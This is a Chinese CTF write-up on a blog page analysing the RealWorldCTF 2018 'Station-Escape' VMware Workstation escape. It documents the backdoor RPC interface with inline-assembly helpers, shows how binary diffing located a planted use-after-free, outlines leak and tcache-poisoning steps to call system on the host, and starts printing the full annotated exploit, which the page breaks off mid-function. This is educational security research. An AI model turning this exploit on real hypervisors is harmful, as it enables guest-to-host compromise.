



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="Kernel, Blockchain, CTF Crypto&PWN">
      
      
        <link rel="canonical" href="https://beafb1b1.github.io/backup/realworldctf_2018_stationescape/">
      
      
        <meta name="author" content="b1b1">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.2">
    
    
      
        <title>RWCTF2018 station-escape - b1b1's share</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.30686662.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#realworldctf-final-station-escape-writeup" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://beafb1b1.github.io/" title="b1b1's share" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              b1b1's share
            </span>
            <span class="md-header-nav__topic">
              
                RWCTF2018 station-escape
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/beafb1b1/beafb1b1.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    beafb1b1/beafb1b1.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="https://beafb1b1.github.io/" title="b1b1's share" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    b1b1's share
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/beafb1b1/beafb1b1.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    beafb1b1/beafb1b1.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="home" class="md-nav__link">
      home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      kernel
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/linux_kernel_base/" title="linux内核基础" class="md-nav__link">
      linux内核基础
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      blockchain
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        blockchain
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../blockchain/realworldctf_2019_bank/" title="RWCTF2019 bank" class="md-nav__link">
      RWCTF2019 bank
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../blockchain/email_bot/" title="email bot" class="md-nav__link">
      email bot
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
    
    <label class="md-nav__link" for="nav-4">
      backup
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        backup
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        RWCTF2018 station-escape
      </label>
    
    <a href="./" title="RWCTF2018 station-escape" class="md-nav__link md-nav__link--active">
      RWCTF2018 station-escape
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    前置知识
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#open-rpc-channel" class="md-nav__link">
    Open RPC channel
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#send-rpc-command-data" class="md-nav__link">
    Send RPC command data
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recieve-rpc-reply-length" class="md-nav__link">
    Recieve RPC reply length
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finish-receiving-rpc-reply" class="md-nav__link">
    Finish receiving RPC reply
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    漏洞分析
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    关于调试
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    相关材料
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../gitpage_fuck/" title="gitpage采坑" class="md-nav__link">
      gitpage采坑
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    前置知识
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#open-rpc-channel" class="md-nav__link">
    Open RPC channel
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#send-rpc-command-data" class="md-nav__link">
    Send RPC command data
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recieve-rpc-reply-length" class="md-nav__link">
    Recieve RPC reply length
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finish-receiving-rpc-reply" class="md-nav__link">
    Finish receiving RPC reply
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    漏洞分析
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    关于调试
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    相关材料
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/beafb1b1/beafb1b1.github.io/edit/master/docs/backup/realworldctf_2018_stationescape.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="realworldctf-final-station-escape-writeup">RealWorldCTF Final Station-Escape Writeup</h1>
<blockquote>
<p>RWCTF Final 2018是我们觉得非常不错的一次竞赛，非常贴近实战，其中每道题目都值得深入研究。其中Station-Escape是一道VMWare Workstation逃逸的题目，我们觉得非常cool，所以进行了详细分析，这里非常感谢<strong>长亭科技</strong>的<strong>flyyy</strong>师傅贡献的非常优秀的题目和悉心的技术指导。本文分析工作由<strong>r3kapig</strong>的<strong>Ne0</strong>和<strong>bibi</strong>完成。</p>
</blockquote>
<h2 id="_1">前置知识</h2>
<p>在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：
```cpp=
MOV EAX, 564D5868h                      /<em> magic number     </em>/
MOV EBX, command-specific-parameter
MOV CX,  backdoor-command-number
MOV DX,  5658h                          /<em> VMware I/O Port  </em>/</p>
<p>IN  EAX, DX (or OUT DX, EAX)</p>
<pre><code>首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。

backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：
```typescript
     +------------------+
     | Open RPC channel |
     +---------+--------+
               |
  +------------v-----------+
  | Send RPC command length|
  +------------+-----------+
               |
  +------------v-----------+
  | Send RPC command data  |
  +------------+-----------+
               |
 +-------------v------------+
 | Recieve RPC reply length |
 +-------------+------------+
               |
  +------------v-----------+
  | Receive RPC reply data |
  +------------+-----------+
               |
+--------------v-------------+
| Finish receiving RPC reply |
+--------------+-------------+
               |
     +---------v---------+
     | Close RPC channel |
     +-------------------+

</code></pre>

<blockquote>
<p>以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：https://sites.google.com/site/chitchatvmback/backdoor</p>
</blockquote>
<h3 id="open-rpc-channel">Open RPC channel</h3>
<blockquote>
<p>RPC subcommand：00h</p>
</blockquote>
<p>调用IN（OUT）前，需要设置的寄存器内容：
```cpp=
EAX = 564D5868h - magic number
EBX = 49435052h - RPC open magic number ('RPCI')
ECX(HI) = 0000h - subcommand number
ECX(LO) = 001Eh - command number
EDX(LO) = 5658h - port number</p>
<pre><code>返回值：
```cpp=
ECX = 00010000h: success / 00000000h: failure
EDX(HI) = RPC channel number
</code></pre>

<p>该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（<code>#0 - #7</code>）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。</p>
<p>我们可以使用如下函数实现Open RPC channel的过程：
```CPP=
void channel_open(int <em>cookie1,int </em>cookie2,int <em>channel_num,int </em>res){
     asm("movl %%eax,%%ebx\n\t"
                "movq %%rdi,%%r10\n\t"
                "movq %%rsi,%%r11\n\t"
                "movq %%rdx,%%r12\n\t"
        "movq %%rcx,%%r13\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0xc9435052,%%ebx\n\t"
                "movl $0x1e,%%ecx\n\t"
                "movl $0x5658,%%edx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%edi,(%%r10)\n\t"
                "movl %%esi,(%%r11)\n\t"
                "movl %%edx,(%%r12)\n\t"
        "movl %%ecx,(%%r13)\n\t"
        :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
        );
}</p>
<pre><code>### Send RPC command length
&gt; RPC subcommand：01h

调用：
```CPP=
EAX = 564D5868h - magic number
EBX = command length (not including the terminating NULL)
ECX(HI) = 0001h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
</code></pre>

<p>返回值：
```CPP=
ECX = 00810000h: success / 00000000h: failure</p>
<pre><code>在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：
```CPP=
void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
                &quot;movl %%ecx,%%ebx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0001001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
            :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
    );
}
</code></pre>

<h3 id="send-rpc-command-data">Send RPC command data</h3>
<blockquote>
<p>RPC subcommand：02h</p>
</blockquote>
<p>调用：
```CPP=
EAX = 564D5868h - magic number
EBX = 4 bytes from the command data (the first byte in LSB)
ECX(HI) = 0002h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number</p>
<pre><code>返回值:
```CPP=
ECX = 000010000h: success / 00000000h: failure
</code></pre>

<p>该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令<code>machine.id.get</code>，那么必须要调用4次，分别为：
```CPP=
EBX set to 6863616Dh ("mach")
EBX set to 2E656E69h ("ine.")
EBX set to 672E6469h ("id.g")
EBX set to 00007465h ("et\x00\x00")</p>
<pre><code>ECX会返回是否成功，具体实现如下：
```CPP=
void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
                &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $0,%%r12\n\t&quot;
        &quot;1:\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;add %%r12,%%rbp\n\t&quot;
        &quot;movl (%%rbp),%%ebx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0002001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
        &quot;addq $4,%%r12\n\t&quot;
        &quot;cmpq %%r12,%%r11\n\t&quot;
        &quot;ja 1b\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}
</code></pre>

<h3 id="recieve-rpc-reply-length">Recieve RPC reply length</h3>
<blockquote>
<p>RPC subcommand：03h</p>
</blockquote>
<p>调用：
```CPP=
EAX = 564D5868h - magic number
ECX(HI) = 0003h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number</p>
<pre><code>返回值：
```CPP=
EBX = reply length (not including the terminating NULL)
ECX = 00830000h: success / 00000000h: failure
</code></pre>

<p>接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中<code>1</code>表示<code>success</code>,<code>0</code>表示<code>failure</code>，即使VMware无法识别RPC command，也会返回<code>0 Unknown command</code>作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。
```CPP=
void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int <em>len,int </em>res){
    asm("movl %%eax,%%ebx\n\t"
                "movq %%r8,%%r10\n\t"
                "movq %%rcx,%%r11\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0003001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
        "movl %%ebx,(%%r11)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
        );</p>
<p>}</p>
<pre><code>### Receive RPC reply data
&gt; RPC subcommand：04h

调用：
```CPP=    
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0004h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
</code></pre>

<p>返回：
```CPP=
EBX = 4 bytes from the reply data (the first byte in LSB)
ECX = 00010000h: success / 00000000h: failure</p>
<pre><code>和`https://sites.google.com/site/chitchatvmback/backdoor`中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在`Recieve RPC reply length`中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问`machine.id.get`，如果成功的话，会返回`1 &lt;virtual machine id&gt;`，否则为`0 No machine id`。
```CPP=
void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
                &quot;movq %%r9,%%r10\n\t&quot;
                &quot;movq %%r8,%%rbp\n\t&quot;
                &quot;movq %%rcx,%%r11\n\t&quot;
                &quot;movq $1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0004001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;in %%dx,%%eax\n\t&quot;
        &quot;add %%r11,%%rbp\n\t&quot;
                &quot;movl %%ebx,(%%rbp)\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                &quot;popq %%rbp\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}
</code></pre>

<h3 id="finish-receiving-rpc-reply">Finish receiving RPC reply</h3>
<blockquote>
<p>RPC subcommand：05h</p>
</blockquote>
<p>调用：
```CPP=
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0005h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number</p>
<pre><code>返回：
```CPP=
ECX = 00010000h: success / 00000000h: failure
</code></pre>

<p>和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过<code>Receive RPC reply data</code>接收完整个reply数据的话，就会返回failure。
```CPP=
void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
                "movq %%rcx,%%r10\n\t"
        "movq $0x1,%%rbx\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0005001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
        );
}</p>
<pre><code>### Close RPC channel
&gt; RPC subcommand：06h

调用：
```CPP=
EAX = 564D5868h - magic number
ECX(HI) = 0006h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
</code></pre>

<p>返回：
```CPP=
ECX = 00010000h: success / 00000000h: failure</p>
<pre><code>关闭channel。
```CPP=
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0006001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
</code></pre>

<h2 id="_2">漏洞分析</h2>
<p>虽然是RealWorld的竞赛，但是因为是魔改的VMWare Workstation，因此我们通过二进制比对的方式可以快速定位到漏洞点，节省大量的二进制程序审计和漏洞挖掘的时间。
<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/MKWqK97.png" />
可以发现出题人仅仅修改了两处，一处在0x1893c9，另一处在0x1893e6。分别对两个位置进行分析：
<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/babk4SB.png" />
首先在0x1893c9处，channel-&gt;out_msg_buf置null的操作被nop掉了：
<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/npSiUHz.png" />
其次在0x1893e6处的函数调用中，v7&amp;1变成了v7&amp;0x21：
<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/MGjbs9N.png" />
在第一处patch中，out_msg_buf没有被置空，其次在第二处patch中，原先被限制的reply type(&amp;0x1)变成了&amp;0x21,也就是说，我们在Finish receiving RPC reply的reply type中可以设置另外一条路径，这条路径会导致在随后的<code>v6</code>这个调用(它会call函数<code>sub_177700</code>)，<code>output buffer</code>被<code>free</code>掉。</p>
<p><img alt="" src="https://i.ibb.co/ZHVgstf/rwctf2.png" /></p>
<p>```CPP=
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
                "movq %%rcx,%%r10\n\t"
                "movq $0x21,%%rbx\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0005001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
        );
}</p>
<pre><code>
## 漏洞利用
由上面的分析可以知，这个patch会导致`UAF`:如果我们在接收完成之后设置了`0x20`这个位，那么`output buffer`就会被释放掉，但由于它没有被清零，所以理论上我们可以无限次的将它`free`掉。有了这些条件，我们要完成整个利用就不难了。

利用步骤如下:
`Leak:`
1. 开两个`channel:A，B`
2. `A`的`output buffer`为`buf_A`,然后`A`释放`buf_A`
3. 这时让`B`准备给`guest`发`output`,`B`会分配一个`buffer`，我们利用`info-set`和`info-get`来控制我们分配的`buffer`大小，使得`B`的`output buffer: buf_B=buf_A`。
4. `A`再次释放`buf_A`，这也导致了`buf_B`被释放。这个时候我们就可以`leak`出`buf_B`的`fd`了,但是这个指针没有什么用，我们想要的是`text base`。
5. 因此我们再执行命令`vmx.capability.dnd_version`,这会让`host`分配一块内存来存放一个`obj`,通过控制`buffer`大小我们可以刚好让`buf_B`被用来存放一个`obj`。而这个`obj`里面有`vtable`,我们可以`leak`出来计算`text base`。注意我们一直没有接受`B`的输出，只是让它做好准备(分配output buffer)。直到这个时候我们才接受它的输出，完成`leak`

`Exploit`

有了`leak`的方法，`exploit`的也是类似的了。简单来说就是`UAF`，把`tcache`的`fd`改到`bss`段，然后改函数指针为`system`,最后弹`calculator`

我给作者的exp加上了注释，大家可以参考:
```cpp=
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rdi,%%r10\n\t&quot;
        &quot;movq %%rsi,%%r11\n\t&quot;
        &quot;movq %%rdx,%%r12\n\t&quot;
        &quot;movq %%rcx,%%r13\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0xc9435052,%%ebx\n\t&quot;
        &quot;movl $0x1e,%%ecx\n\t&quot;
        &quot;movl $0x5658,%%edx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%edi,(%%r10)\n\t&quot;
        &quot;movl %%esi,(%%r11)\n\t&quot;
        &quot;movl %%edx,(%%r12)\n\t&quot;
        &quot;movl %%ecx,(%%r13)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
       );
}

void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
        &quot;movl %%ecx,%%ebx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0001001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}

void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
        &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $0,%%r12\n\t&quot;
        &quot;1:\n\t&quot;
